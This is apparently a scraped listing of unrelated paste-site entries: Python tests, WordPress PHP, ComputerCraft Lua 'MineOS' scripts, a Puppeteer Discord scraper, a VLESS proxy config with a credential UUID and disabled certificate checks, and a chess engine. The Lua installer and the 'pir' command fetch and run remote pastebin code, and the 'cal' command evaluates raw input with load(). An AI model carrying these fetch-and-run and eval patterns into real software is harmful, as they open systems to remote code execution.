        s = [""Ana"", ""Ana"", ""Berta"", ""Cilka"", ""Ana"", ""Berta"", ""Berta"", ""Berta"", ""Ema"", ""Dani"", ""Cilka""]
        sc = s.copy()
        t = [""Cilka"", ""Fanči"", ""Ana"", ""Ana"", ""Fanči"", ""Ana"", ""Cilka""]
        tc = t.copy()
        self.assertEqual(6, vseh(s, t))
        self.assertEqual(6, vseh(t, s))
        self.assertEqual(sc, s, ""Pusti seznam, ki ga funkcija dobi kot argument, pri miru!"")
        self.assertEqual(tc, t, ""Pusti seznam, ki ga funkcija dobi kot argument, pri miru!"")
        self.assertEqual(7, vseh(s, [""Fanči"", ""Greta""]))
        self.assertEqual(4, vseh(t, [""Fanči"", ""Greta""]))
        self.assertEqual(5, vseh(s, []))
        self.assertEqual(0, vseh([], []))


class TestProcesiranjeSeznamov(NoWarning):
    def test_01_preberi_datoteko(self):
        self.assertEqual([['Cube', '5031', '159', 'Janez', '2017\n'],
                          ['Stevens', '3819', '1284', 'Ana', '2012\n'],
                          ['Focus', '3823', '1921', 'Benjamin', '2019\n']],
                         preberi_datoteko(""kolesa.txt"", ""-""))
        self.assertEqual([['slika', 'Berta', '31\n'],
                          ['slika', 'Ana', '33\n'],
                          ['slika', 'Berta', '35\n'],
                          ['slika', 'Fanči', '37\n'],
                          ['slika', 'Ana', '40\n']],
                         preberi_datoteko(""zapisnik.txt"", "","")[:5])

    def test_02_filter(self):
        s = [[""Ana"", 5, 9, ""Berta""],
             [""Cilka"", 5, 12, ""Berta""],
             [""Ana"", 5, 9, ""Cilka""],
             [""Berta"", 5, 1, ""Ana""]]
        self.assertEqual(
            [[""Ana"", 5, 9, ""Berta""],
             [""Ana"", 5, 9, ""Cilka""]], filtriran(s, 0, ""Ana"")
        )
        self.assertEqual(
            [[""Ana"", 5, 9, ""Cilka""],
             [""Ana"", 5, 9, ""Berta""]], filtriran(s[::-1], 0, ""Ana"")
        )
        self.assertEqual(s, filtriran(s, 1, 5))
        self.assertEqual([], filtriran(s, 0, ""Dani""))
        self.assertEqual([[""Ana"", 5, 9, ""Cilka""]], filtriran(s, 3, ""Cilka""))

    def test_03_izlusci(self):
        s = [[""Ana"", 5, 9, ""Berta""],
             [""Cilka"", 5, 12, ""Berta""],
             [""Ana"", 5, 9, ""Cilka""],
             [""Berta"", 5, 1, ""Ana""]]
        self.assertEqual([""Ana"", ""Cilka"", ""Ana"", ""Berta""], izlusci(s, 0))
        self.assertEqual([5, 5, 5, 5], izlusci(s, 1))
        self.assertEqual([9, 12, 9, 1], izlusci(s, 2))


class TestDrazba(NoWarning):
    def test_01_predmeti(self):
        self.assertEqual(['slika', 'Meldrumove vaze'], predmeti(""zapisnik.txt"", ""Ana""))
        self.assertEqual(['slika', 'skodelice', 'kip', 'čajnik'], predmeti(""zapisnik.txt"", ""Berta""))
        self.assertEqual(['Meldrumove vaze', 'kip', 'srebrn jedilni servis'], predmeti(""zapisnik.txt"", ""Cilka""))
        self.assertEqual([], predmeti(""zapisnik.txt"", ""Benjamin""))

        try:
            os.rename(""zapisnik.txt"", ""zapisnik-2.txt"")
            self.assertEqual(['slika', 'Meldrumove vaze'], predmeti(""zapisnik-2.txt"", ""Ana""))
        finally:
            os.rename(""zapisnik-2.txt"", ""zapisnik.txt"")

    def test_02_osebe(self):
        self.assertEqual(['Cilka', 'Ema', 'Berta', 'Dani', 'Greta'], osebe(""zapisnik.txt"", ""kip""))
        self.assertEqual(['Fanči', 'Helga'], osebe(""zapisnik.txt"", ""perzijska preproga""))
        self.assertEqual([], osebe(""zapisnik.txt"", ""stol brez noge""))

    def test_03_podobnost_oseb(self):
        self.assertAlmostEqual(0.2, podobnost_oseb(""zapisnik.txt"", ""Ana"", ""Berta""))
        self.assertAlmostEqual(0.5, podobnost_oseb(""zapisnik.txt"", ""Cilka"", ""Ema""))
        self.assertAlmostEqual(0.25, podobnost_oseb(""zapisnik.txt"", ""Ana"", ""Cilka""))
        self.assertAlmostEqual(1 / 6, podobnost_oseb(""zapisnik.txt"", ""Berta"", ""Cilka""))
        self.assertAlmostEqual(1, podobnost_oseb(""zapisnik.txt"", ""Berta"", ""Berta""))

    def test_04_podobnost_predmetov(self):
        self.assertAlmostEqual(0.4, podobnost_predmetov(""zapisnik.txt"", ""kip"", ""skodelice""))
        self.assertAlmostEqual(1 / 7, podobnost_predmetov(""zapisnik.txt"", ""kip"", ""slika""))
        self.assertAlmostEqual(0, podobnost_predmetov(""zapisnik.txt"", ""kip"", ""perzijska preproga""))
        self.assertAlmostEqual(1, podobnost_predmetov(""zapisnik.txt"", ""kip"", ""kip""))


# class TestPriporocila(NoWarning):
#     def test_01_priporoci_predmet(self):
#         self.assertEqual(""srebrn jedilni servis"", priporoci_predmet(""zapisnik.txt"", ""kip""))
#         self.assertEqual(""Meldrumove vaze"", priporoci_predmet(""zapisnik.txt"", ""slika""))
#
#     def test_02_priporoci_prijatelja(self):
#         self.assertEqual(""Fanči"", priporoci_prijatelja(""zapisnik.txt"", ""Ana""))
#         self.assertEqual(""Dani"", priporoci_prijatelja(""zapisnik.txt"", ""Berta""))
#

if __name__ == ""__main__"":
    unittest.main()"
MwmQiMfJ,wcfm-booking-calendar-event-visibility,palsushobhan,PHP,Tuesday 22nd of July 2025 10:19:36 AM CDT,"add_action('after_wcfm_load_scripts', function($endpoint) {
    if('wcfm-bookings-calendar' === $endpoint) { 
        if (defined('WC_BOOKINGS_VERSION') && version_compare(WC_BOOKINGS_VERSION, '1.15.0', '>=')) {
            $admin_script_dependencies = wc_booking_get_script_dependencies( 'admin', [ 'jquery-ui-datepicker', 'jquery-ui-sortable' ] );
            wp_enqueue_script( 'wc_bookings_admin_js', WC_BOOKINGS_PLUGIN_URL . '/dist/admin.js', $admin_script_dependencies, WC_BOOKINGS_VERSION, true );
            if (WC_BOOKINGS_GUTENBERG_EXISTS) {
                $admin_calendar_gutenberg_deps = wc_booking_get_script_dependencies( 'admin-calendar-gutenberg', array( 'wc_bookings_admin_js' ) );
                wp_enqueue_script( 'wc_bookings_admin_calendar_gutenberg_js', WC_BOOKINGS_PLUGIN_URL . '/dist/admin-calendar-gutenberg.js', $admin_calendar_gutenberg_deps, WC_BOOKINGS_VERSION, true );
            }
            
            wp_enqueue_script( 'wc_bookings_admin_calendar_js', WC_BOOKINGS_PLUGIN_URL . '/dist/admin-calendar.js', wc_booking_get_script_dependencies( 'admin-calendar' ), WC_BOOKINGS_VERSION, true );
        }
    }
}, 29);

add_action( 'wp_footer', function() {
    global $wp;
    if( is_wcfm_page() && isset($wp->query_vars['wcfm-bookings-calendar']) && class_exists( 'WC_Site_Tracking' )) {
        WC_Site_Tracking::add_tracking_function();
    }
} );

add_action('after_wcfm_load_styles', function($endpoint) {
    if('wcfm-bookings-calendar' === $endpoint && WC_BOOKINGS_GUTENBERG_EXISTS) {
        wp_enqueue_style('wc_bookings_admin_calendar_css', WC_BOOKINGS_PLUGIN_URL.'/dist/admin-calendar-gutenberg.css', null, WC_BOOKINGS_VERSION);
        $calendar_event_popup_css = ""
            .wc-bookings-calendar-popover .components-popover__content {
                background: #fff;
                border-radius: 4px;
                box-shadow: 0 0 0 1px #ccc,0 2px 3px #0000000d,0 4px 5px #0000000a,0 12px 12px #00000008,0 16px 16px #00000005;
                box-sizing: border-box;
                width: min-content;
            }"";
        wp_add_inline_style( 'wc_bookings_admin_calendar_css', $calendar_event_popup_css );
    }
}, 29);"
upy0WdSS,2.4I,GochiPC,Lua,Tuesday 22nd of July 2025 09:42:32 AM CDT,"term.clear()
term.setCursorPos(1,1)
print(""Please wait..."")
sleep(3)
term.clear()
term.setCursorPos(1,1)
print(""Welcome to MineOS 2.4 Installer"")
print(""type start/exit"")
print(""warning if you have other os it will removes startup file"")
local choice = read()

if choice == ""start"" then
  print(""Please wait this will take secs"")
  sleep(1)
  shell.run(""delete startup.lua"")
  shell.run(""pastebin get 6G1Fsc9w startup.lua"")
  print(""rebooting..."")
  sleep(3)
  os.reboot()
elseif choice == ""exit"" then
  print(""exiting the installer"")
  return
else
  print(""Invalid option"")
end
"
KnBhCfkR,2.4U,GochiPC,Lua,Tuesday 22nd of July 2025 09:40:49 AM CDT,"local label = os.getComputerLabel()

if label == ""2.4"" then
  print(""You allready have this version "" .. label)
  return
end

if label == ""2.1"" or label == ""2.2"" or label == ""2.3"" then
    term.clear()
    term.setCursorPos(1,1)
    print(""Welcome to MineUpdater"")
    print(""please wait to update 2.3"")
    sleep(2)
    print(""removing old file"")
    shell.run(""delete startup.lua"")
    sleep(5)
    print(""installing new files"")
    sleep(2)
    shell.run(""pastebin get 6G1Fsc9w startup.lua"")
    sleep(2)
    print(""the update complete"")
    print(""please wait this will reboot"")
    sleep(4)
    os.reboot()
end

print(""you dont have MineOS2 or you have Unsupported Version."")"
6G1Fsc9w,2.4,GochiPC,Lua,Tuesday 22nd of July 2025 09:30:37 AM CDT,"-- WARNING DO NOT EDIT SCRIPT THIS EILL BUG OS
-- if you are best at script why you give it an try
-- to see make an os but if you are an noob
-- dont edit

-- Color Saveing
if fs.exists(""bsave.txt"") then
  if not term.isColor() then
   term.setBackgroundColor(colors.black)
  else
   local f = fs.open(""bsave.txt"", ""r"")
   local savedColor = f.readAll()
   f.close()
   if savedColor == ""green"" then
     term.setBackgroundColor(colors.green)
   elseif savedColor == ""blue"" then
     term.setBackgroundColor(colors.blue)
   elseif savedColor == ""black"" then
     term.setBackgroundColor(colors.black)
   elseif savedColor == ""gray"" then
     term.setBackgroundColor(colors.gray)
   end
  end
  term.clear()
end
wel = ""Welcome Player!""

-- MineOS
local running = true

-- start at first
os.setComputerLabel(""2.4"")
term.setCursorPos(1,1)
term.clear()
term.setTextColor(colors.yellow)
if fs.exists(""nsave.txt"") then
      local file = fs.open(""nsave.txt"", ""r"")
      local saved = file.readAll()
      file.close()
      print(""Welcome "" .. saved .. ""!"")
else
      print(wel)
end

local speaker = peripheral.find(""speaker"")
if speaker then
  speaker.playNote(""pling"", 1.0, 12)
  sleep(0.4)
  speaker.playNote(""pling"", 1.0, 10)
end
sleep(3)
term.clear()
term.setCursorPos(1,1)
print(""MineOS2"")

-- prompt
while running do
    
    -- detector
    term.setTextColor(colors.yellow)
    io.write(""> "")
    term.setTextColor(colors.white)
    local input = read()
    local args = {}
    for word in string.gmatch(input, ""[^%s]+"") do
        table.insert(args, word)
    end

    local command = args[1]

-- commands

    if command == ""about"" then
        print(""   _______    MineOS"")
        print(""  |   |   |   Version: 2.4"")
        print(""  | S | e |   Kernel: DEV2"")
        print(""  | O | n |   CCID: "" .. os.getComputerID())
        print(""  |   | i |   Uptime: "" .. math.floor(os.clock()) .. ""s"")
        print(""  | > | M |   CR: 2023 - 2025"")
        if term.isColor() then
            print(""              Color: true"")
        else
            print(""              Color: false"")
        end
        
    elseif command == ""help"" then
        term.setTextColor(colors.orange)
        print(""Help"")
        term.setTextColor(colors.white)
        print(""tipe 'plist' or 'mlist'"")
        
        elseif command == ""plist"" then
        local dir = shell.dir()
        local files = fs.list(dir)
        for i, file in ipairs(files) do
            local fullPath = fs.combine(dir, file)
            local isStartupInRoot = (dir == ""/"" or dir == """") and file == ""startup.lua""
            local isHidden = file:match(""^%."")
            local isRom = file == ""rom""
            if not isRom and not isStartupInRoot and not isHidden then
                if fs.isDir(fullPath) then
                    print(""FO "" .. file)
                else
                    print(""FI "" .. file)
                end
            end
        end
        
    elseif command == ""hello"" then
        term.clear()
        term.setCursorPos(1,1)
        term.setTextColor(colors.orange)
        textutils.slowPrint(""Hello World!"")
        sleep(3)
        term.clear()
        term.setCursorPos(1,1)
        
    elseif command == ""pedit"" then
     local filename = args[2]
     if filename then
      local lower = string.lower(filename)
      if lower == ""startup"" or lower == ""startup.lua"" then
       print(""Warning you about to edit OS File"")
       sleep(2)
       local prevBG = term.getBackgroundColor()
       shell.run(""edit"", ""startup.lua"")
       term.setBackgroundColor(prevBG)
       term.clear()
       term.setCursorPos(1, 1)
      elseif fs.isDir(filename) then
       print(""Cannot edit folder"")
      else
         local ok, err = pcall(function()
         local prevBG = term.getBackgroundColor()
         shell.run(""edit"", filename)
         term.setBackgroundColor(prevBG)
         term.clear()
         term.setCursorPos(1, 1)
      end)
      if not term.isColor() then
      term.clear()
      term.setCursorPos(1,1)
      else
       if not ok then print(""Edit failed ""..tostring(err)) end
       if ok and fs.exists(""bsave.txt"") then
        local f = fs.open(""bsave.txt"", ""r"")
        local saved = f.readAll()
        f.close()
        if colors[saved] then
         term.setBackgroundColor(colors[saved])
         term.clear()
         term.setCursorPos(1, 1)
        end
       end
      end
     end
    end
       
    elseif command == ""popen"" then
        local progName = args[2]
        if progName then
            local lower = string.lower(progName)
            if lower == ""startup"" or lower == ""startup.lua"" then
                print(""Error opening that file"")
            elseif shell.resolveProgram(progName) then
                print(""Running "" .. progName)
                shell.run(progName)
            else
                print(""Unknown Program to open"")
            end
        end
    
    elseif command == ""mlist"" then
      local lines = {
        """",
        ""hello"",
        ""about"",
        ""shutoff"",
        ""popen <1>"",
        ""pedit <1>"",
        ""reboot"",
        ""cls"",
        ""shell"",
        ""cal <math>"",
        ""plist"",
        ""mlist"",
        ""pdelete <1>"",
        ""pir <ins/run>"",
        ""prename <1> <2>"",
        ""cd <1>"",
        ""mfolder <1>"",
        ""tcolor <color>"",
        ""cname <name>""
      }

      local w, h = term.getSize()
      local line = 0
      line = 2
      for i = 2, #lines do
        print(lines[i])
        line = line + 1
        if line >= h then
            print(""Press any key to continue..."")
            os.pullEvent(""key"")
            term.clear()
            term.setCursorPos(1,1)
            line = 2
        end
      end
        
    elseif command == ""shutoff"" then
        term.clear()
        term.setCursorPos(1,1)
        print(""Please Wait..."")
        sleep(1)
        term.setCursorPos(1,1)
        term.setTextColor(colors.red)
        print(""ShuttingOFF..."")
        sleep(4)
        running = false
        os.shutdown()
    
    elseif command == ""reboot"" then
        term.clear()
        term.setCursorPos(1,1)
        print(""Please Wait..."")
        sleep(1)
        term.clear()
        term.setCursorPos(1,1)
        term.setTextColor(colors.red)
        print(""Rebooting..."")
        sleep(4)
        running = false
        os.reboot()
    
    elseif command == ""cls"" then
        term.clear()
        term.setCursorPos(1,1)
    
    elseif command == ""shell"" then
        term.setTextColor(colors.yellow)
        print(""MineOS2"")
        
    elseif command == ""cal"" then
        local expression = input:sub(5) -- everything after 'cal '
        local fn, err = load(""return "" .. expression)
        if fn then
            local ok, result = pcall(fn)
            if ok then
                print(result)
            else
                print(""Error"")
            end
        end
        
    elseif command == ""pdelete"" then
      local filename = args[2]

      if filename then
        filename = filename
        local currentDir = shell.dir()
        local fullPath = fs.combine(currentDir, filename)
        local lower = string.lower(filename)
        if currentDir == """" and (lower == ""startup.lua"" or lower == ""startup"") then
            print(""Error deleting that file"")
        elseif fs.exists(fullPath) then
            fs.delete(fullPath)
            print(""Deleted "" .. filename)
        else
            print(""File not found "" .. filename)
        end
      end
        
    elseif command == ""pir"" then
      local sub = args[2]
      local code = args[3]

      if sub == ""run"" and code then
        shell.run(""pastebin"", ""run"", code)

      elseif sub == ""ins"" and code then
        local saveAs = ""pir_"" .. code
        shell.run(""pastebin"", ""get"", code, saveAs)
        print(""Installed as "" .. saveAs)
      end
        
    elseif command == ""prename"" then
      local oldName = args[2]
      local newName = args[3]

      if not oldName or not newName then
      else
        oldName = oldName .. "".lua""
        newName = newName .. "".lua""
        local currentDir = shell.dir()
        local fullOldPath = fs.combine(currentDir, oldName)
        local fullNewPath = fs.combine(currentDir, newName)
        if currentDir == """" and (oldName == ""startup.lua"" or newName == ""startup.lua"") then
            print(""Error renaming that file"")
        elseif not fs.exists(fullOldPath) then
            print(""Not exist"" .. oldName)
        elseif fs.exists(fullNewPath) then
            print(""Already exists "" .. newName)
        else
            fs.move(fullOldPath, fullNewPath)
            print(""Renamed "" .. newName)
        end
      end
        
    elseif command == ""cd"" then
        local target = args[2]
        if target and fs.exists(target) and fs.isDir(target) then
            shell.setDir(target)
            print(""Changed Dir "" .. shell.dir())
        else
            print(""Dir not found"")
        end
        
    elseif command == ""mfolder"" then
          local folderName = args[2]
          if folderName then
            local currentDir = shell.dir()
            local fullPath = fs.combine(currentDir, folderName)
            if fs.exists(fullPath) then
              print(""Folder exist"")
            else
              fs.makeDir(fullPath)
              print(""Created "" .. folderName)
            end
          end
        
   elseif command == ""tcolor"" then
    if not term.isColor() then
     print(""This computer cant work with colors"")
    else
     local colorname = args[2]
     if colorname == ""green"" then
     term.setBackgroundColor(colors.green)
     term.clear()
     term.setCursorPos(1,1)
     local f = fs.open(""bsave.txt"", ""w"")
     f.write(""green"")
     f.close()
     elseif colorname == ""blue"" then
     term.setBackgroundColor(colors.blue)
     term.clear()
     term.setCursorPos(1,1)
     local f = fs.open(""bsave.txt"", ""w"")
     f.write(""blue"")
     f.close()
     elseif colorname == ""black"" then
     term.setBackgroundColor(colors.black)
     term.clear()
     term.setCursorPos(1,1)
     local f = fs.open(""bsave.txt"", ""w"")
     f.write(""black"")
     f.close()
     elseif colorname == ""gray"" then
     term.setBackgroundColor(colors.gray)
     term.clear()
     term.setCursorPos(1,1)
     local f = fs.open(""bsave.txt"", ""w"")
     f.write(""gray"")
     f.close()
     elseif colorname == ""help"" then
      print(""Colors only that you can change"")
      print(""Blue/Gray/Black/Green"")
     else
     print(""Invalid color."")
     end
    end
        
   elseif command == ""cname"" then
    if args[2] then
      local file = fs.open(""nsave.txt"", ""w"")
      file.write(args[2])
      file.close()
      print(""Name saved: "" .. args[2])
    end

   else
        print(""Unknown MProgram to open"")
    end
end"
pVnHPFft,Untitled,guy9329932,JavaScript,Tuesday 22nd of July 2025 08:55:36 AM CDT,"const puppeteer = require('puppeteer');
const fs = require('fs');
const path = require('path');

// Настройки
const OUTPUT_FILE = 'C:\\Users\\ТИМОФЕЙ\\AppData\\Roaming\\Swift\\Workspace\\output.txt';
const PROCESSED_FILE = 'C:\\Users\\ТИМОФЕЙ\\AppData\\Roaming\\Swift\\Workspace\\processed.txt';
const SERVER_ID = '1385491616013221990'; // ID сервера
const CHANNEL_ID = '1394958063341015081'; // ID канала
const TOKEN = 'YOUR_TOKEN'; // Замени на токен авторизации
const REGEX_PATTERN = /gameInstanceId=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})/i;

(async () => {
  try {
    // Создаем папки
    fs.mkdirSync(path.dirname(OUTPUT_FILE), { recursive: true });
    fs.mkdirSync(path.dirname(PROCESSED_FILE), { recursive: true });

    // Загружаем обработанные UUID
    let processedUUIDs = fs.existsSync(PROCESSED_FILE)
      ? fs.readFileSync(PROCESSED_FILE, 'utf-8').split('\n').filter(Boolean)
      : [];

    // Подключаемся к Chrome
    const browser = await puppeteer.connect({
      browserURL: 'http://127.0.0.1:9222',
    });
    const pages = await browser.pages();
    let page = pages.find(p => p.url().includes(`discord.com/channels/${SERVER_ID}/${CHANNEL_ID}`));
    if (!page) {
      page = await browser.newPage();
      await page.goto(`https://discord.com/channels/${SERVER_ID}/${CHANNEL_ID}`, {
        waitUntil: 'networkidle0',
      });
    }

    // Ждем загрузки сообщений
    await page.waitForSelector('.message-2qnXI6', { timeout: 5000 }).catch(err => {
      console.error('Не удалось найти сообщения:', err);
      browser.disconnect();
      return;
    });

    // Внедряем MutationObserver
    await page.evaluate((regexPattern, outputFile, processedFile) => {
      let processedUUIDs = [];
      let processedMessageIds = new Set();

      function saveToFile(uuid) {
        console.log('__SAVE_UUID__', JSON.stringify({ uuid }));
      }

      const observer = new MutationObserver(mutations => {
        mutations.forEach(mutation => {
          if (mutation.addedNodes.length) {
            const newMessages = Array.from(document.querySelectorAll('.message-2qnXI6')).filter(
              el => !processedMessageIds.has(el.id)
            );
            newMessages.forEach(msg => {
              const text = msg.querySelector('.messageContent-2qVZmX')?.innerText || '';
              const match = text.match(new RegExp(regexPattern, 'i'));
              if (match && !processedUUIDs.includes(match[1])) {
                processedMessageIds.add(msg.id);
                processedUUIDs.push(match[1]);
                saveToFile(match[1]);
              }
            });
          }
        });
      });

      const scroller = document.querySelector('.scroller-kQBbkU');
      if (scroller) {
        observer.observe(scroller, { childList: true, subtree: true });
      } else {
        console.error('Контейнер сообщений не найден');
      }
    }, REGEX_PATTERN.source, OUTPUT_FILE, PROCESSED_FILE);

    // Перехватываем консоль
    page.on('console', async msg => {
      const text = msg.text();
      if (text.startsWith('__SAVE_UUID__')) {
        const { uuid } = JSON.parse(text.replace('__SAVE_UUID__', ''));
        if (!processedUUIDs.includes(uuid)) {
          fs.appendFileSync(OUTPUT_FILE, uuid + '\n', 'utf-8');
          fs.appendFileSync(PROCESSED_FILE, uuid + '\n', 'utf-8');
          console.log('Новый gameInstanceId сохранен:', uuid);
          processedUUIDs.push(uuid);
        }
      }
    });

    // Держим скрипт активным
    process.on('SIGINT', async () => {
      console.log('Завершение работы...');
      await browser.disconnect();
      process.exit();
    });
  } catch (error) {
    console.error('Ошибка:', error);
    process.exit(1);
  }
})();"
e2mBMFWw,Untitled,darmod,Lua,Tuesday 22nd of July 2025 08:51:43 AM CDT,"-- sender.lua
-- Replace ""filename.lua"" with the file you want to send
local filename = ""myprogram.lua"" 
local targetID = 123 -- Replace with the ID of the receiving computer

rednet.open(""right"") -- Open rednet on the ""right"" side (adjust as needed)

local file = fs.open(filename, ""r"") -- Open the file for reading
local content = file.readAll() -- Read the entire file content into a string
file.close() -- Close the file

rednet.send(targetID, filename) -- Send the filename first
os.sleep(1) -- Give the receiver a moment to process (optional)
rednet.send(targetID, content) -- Send the file content

rednet.close(""right"") -- Close rednet on the ""right"" side (adjust as needed)
print(""File '"" .. filename .. ""' sent to ID: "" .. targetID)
"
cW5uJDyF,Untitled,darmod,Lua,Tuesday 22nd of July 2025 08:51:26 AM CDT,"-- receiver.lua
rednet.open(""right"") -- Open rednet on the ""right"" side (adjust as needed)

print(""Waiting to receive file..."")

while true do
    local senderID, message = rednet.receive() -- Wait for a message

    -- Assuming the first message is the filename
    if type(message) == ""string"" and not filename then
        filename = message
        print(""Receiving file: "" .. filename)
    elseif filename then -- If we already have the filename, the next message is the content
        local file = fs.open(filename, ""w"") -- Open a new file with the received name for writing
        file.write(message) -- Write the received content to the file
        file.close() -- Close the file
        print(""File '"" .. filename .. ""' received!"")
        filename = nil -- Reset for next file transfer
    end
end
"
n6hbuYNT,XL VIDIO CLOUD,AZWIR,YAML,Tuesday 22nd of July 2025 07:02:46 AM CDT,"port: 7890
socks-port: 7891
redir-port: 7892
mixed-port: 7893
tproxy-port: 7895
ipv6: false
mode: rule
log-level: silent
allow-lan: true
external-controller: 0.0.0.0:9090
secret: """"
bind-address: ""*""
unified-delay: true
profile:
store-selected: true
dns:
  enable: true
  ipv6: false
  enhanced-mode: redir-host
  listen: 0.0.0.0:7874
  nameserver:
    - 8.8.8.8
    - 1.0.0.1
    - https://dns.google/dns-query
  fallback:
    - 1.1.1.1
    - 8.8.4.4
    - https://cloudflare-dns.com/dns-query
    - 112.215.203.254
  default-nameserver:
    - 8.8.8.8
    - 1.1.1.1
    - 112.215.203.254
proxies:
  - name: VIDIO 1
    server: 104.17.155.243
    port: 443
    type: vless
    uuid: b46036f7-9a6b-4ed8-9c06-dcb38b18b881
    cipher: auto
    tls: true
    skip-cert-verify: true
    servername: wilo.luckystup-id.xyz
    network: ws
    ws-opts:
      path: /103.102.231.124-2053
      headers:
        Host: wilo.luckystup-id.xyz
    udp: true
    proxies:
      - VIDIO 1
"
PGj560MT,dataNone,TestGuy1,JSON,Tuesday 22nd of July 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'acaba1552b35b5d4ed1054f11f392700424f1678ac8f6f6743a888b6ad60c4c62f9404846a8300d3a58c8d1f7a6b29e14c435b599fb29673fc97ebd6de626e80e90a60a899c96358514542c8fdfdae98e03122a92c002493f1de7b92c1da5e7915f6a6bf7d8a02ca7331c47447f5d43b3c6b04bcb49eab4e6ad5b42c6e8c2915',
  otherdata: [
    'fd034d43ae591f8fa08da7792b462e95',
    '3e1e42a642cf938decb94fe581541f27',
    '37c7db6762741d6b201022071c45d12a',
    '2047081002da06cd02a6aefe2466b012',
    'cdb84693e5c8ee119754c0c8d6a1fd5a',
    'b50508ca2328486c745d67abafd5a792',
    '318c5589ccf4f17259672e963019b3eb',
    '810d026e3d212e5cc4608a86f642dfa6'
  ]
}"
D2jwLaAU,excellent 4 OK very good final 2,max2201111,Python,Tuesday 22nd of July 2025 05:22:59 AM CDT,"import time
import copy
from datetime import datetime
from typing import List, Tuple, Optional, Dict, Set

class ChessEngine:
    def __init__(self):
        # Základní nastavení
        self.board = [['' for _ in range(8)] for _ in range(8)]
        self.white_to_move = True
        self.castling_rights = {'K': True, 'Q': True, 'k': True, 'q': True}
        self.en_passant = None
        self.halfmove_clock = 0
        self.fullmove_number = 1
        
        # Hodnoty figur pro evaluaci
        self.piece_values = {
            'P': 100, 'N': 320, 'B': 330, 'R': 500, 'Q': 900, 'K': 20000,
            'p': -100, 'n': -320, 'b': -330, 'r': -500, 'q': -900, 'k': -20000,
            'A': 1200, 'a': -1200,  # Amazonka (kůň + dáma)
            'C': 800, 'c': -800,    # Cyril (kůň + věž)
            'E': 650, 'e': -650     # Eve (kůň + střelec)
        }
        
        # Historie tahů pro výpis cesty
        self.move_history = []
        self.position_history = []
        
    def load_fen(self, fen: str):
        """"""Načte pozici z FEN stringu""""""
        # Nejdříve vymaž šachovnici
        self.board = [['' for _ in range(8)] for _ in range(8)]
        
        parts = fen.split()
        
        # Parsování pozice
        rows = parts[0].split('/')
        for row_idx, row in enumerate(rows):
            if row_idx >= 8:  # Ochrana proti příliš mnoha řádkům
                break
            col_idx = 0
            for char in row:
                if col_idx >= 8:  # Ochrana proti překročení sloupců
                    break
                if char.isdigit():
                    # Prázdná pole
                    empty_squares = int(char)
                    for _ in range(empty_squares):
                        if col_idx < 8:
                            self.board[row_idx][col_idx] = ''
                            col_idx += 1
                else:
                    self.board[row_idx][col_idx] = char
                    col_idx += 1
        
        # Na tahu
        self.white_to_move = parts[1] == 'w'
        
        # Rošáda
        castling = parts[2] if len(parts) > 2 else '-'
        self.castling_rights = {
            'K': 'K' in castling,
            'Q': 'Q' in castling,
            'k': 'k' in castling,
            'q': 'q' in castling
        }
        
        # En passant
        self.en_passant = parts[3] if len(parts) > 3 and parts[3] != '-' else None
        
        # Počet tahů
        self.halfmove_clock = int(parts[4]) if len(parts) > 4 else 0
        self.fullmove_number = int(parts[5]) if len(parts) > 5 else 1
        
    def to_fen(self) -> str:
        """"""Převede aktuální pozici na FEN string""""""
        # Pozice
        fen_rows = []
        for row in self.board:
            fen_row = ''
            empty_count = 0
            for cell in row:
                if cell == '':
                    empty_count += 1
                else:
                    if empty_count > 0:
                        fen_row += str(empty_count)
                        empty_count = 0
                    fen_row += cell
            if empty_count > 0:
                fen_row += str(empty_count)
            fen_rows.append(fen_row)
        
        board_fen = '/'.join(fen_rows)
        
        # Na tahu
        active_color = 'w' if self.white_to_move else 'b'
        
        # Rošáda
        castling = ''
        if self.castling_rights['K']: castling += 'K'
        if self.castling_rights['Q']: castling += 'Q'
        if self.castling_rights['k']: castling += 'k'
        if self.castling_rights['q']: castling += 'q'
        if not castling: castling = '-'
        
        # En passant
        en_passant = self.en_passant if self.en_passant else '-'
        
        return f""{board_fen} {active_color} {castling} {en_passant} {self.halfmove_clock} {self.fullmove_number}""
    
    def print_board(self):
        """"""Vypíše šachovnici v ASCII formátu""""""
        print(""  a b c d e f g h"")
        for i in range(8):
            print(f""{8-i} "", end="""")
            for j in range(8):
                piece = self.board[i][j]
                if piece == '':
                    piece = '.'
                print(f""{piece} "", end="""")
            print(f""{8-i}"")
        print(""  a b c d e f g h"")
        print()
    
    def is_white_piece(self, piece: str) -> bool:
        """"""Zjistí, zda je figura bílá""""""
        return piece.isupper()
    
    def get_piece_moves(self, row: int, col: int, check_castling: bool = True) -> List[Tuple[int, int]]:
        """"""Získá všechny možné tahy pro figuru na dané pozici""""""
        piece = self.board[row][col]
        if piece == '':
            return []
        
        piece_type = piece.lower()
        is_white = self.is_white_piece(piece)
        moves = []
        
        if piece_type == 'p':
            # Pěšec
            direction = -1 if is_white else 1
            start_row = 6 if is_white else 1
            
            # Tah dopředu
            if 0 <= row + direction < 8 and self.board[row + direction][col] == '':
                moves.append((row + direction, col))
                # Dvojitý tah z počáteční pozice
                if row == start_row and self.board[row + 2 * direction][col] == '':
                    moves.append((row + 2 * direction, col))
            
            # Braní úhlopříčně
            for dc in [-1, 1]:
                new_row, new_col = row + direction, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target != '' and self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
                    # En passant
                    elif self.en_passant and self.en_passant == f""{chr(ord('a') + new_col)}{8 - new_row}"":
                        moves.append((new_row, new_col))
        
        elif piece_type == 'r':
            # Věž
            directions = [(0, 1), (0, -1), (1, 0), (-1, 0)]
            for dr, dc in directions:
                for i in range(1, 8):
                    new_row, new_col = row + i * dr, col + i * dc
                    if not (0 <= new_row < 8 and 0 <= new_col < 8):
                        break
                    target = self.board[new_row][new_col]
                    if target == '':
                        moves.append((new_row, new_col))
                    else:
                        if self.is_white_piece(target) != is_white:
                            moves.append((new_row, new_col))
                        break
        
        elif piece_type == 'n':
            # Kůň
            knight_moves = [(2, 1), (2, -1), (-2, 1), (-2, -1), (1, 2), (1, -2), (-1, 2), (-1, -2)]
            for dr, dc in knight_moves:
                new_row, new_col = row + dr, col + dc
                if 0 <= new_row < 8 and 0 <= new_col < 8:
                    target = self.board[new_row][new_col]
                    if target == '' or self.is_white_piece(target) != is_white:
                        moves.append((new_row, new_col))
        
        elif piece_type == 'b':
            # Střelec
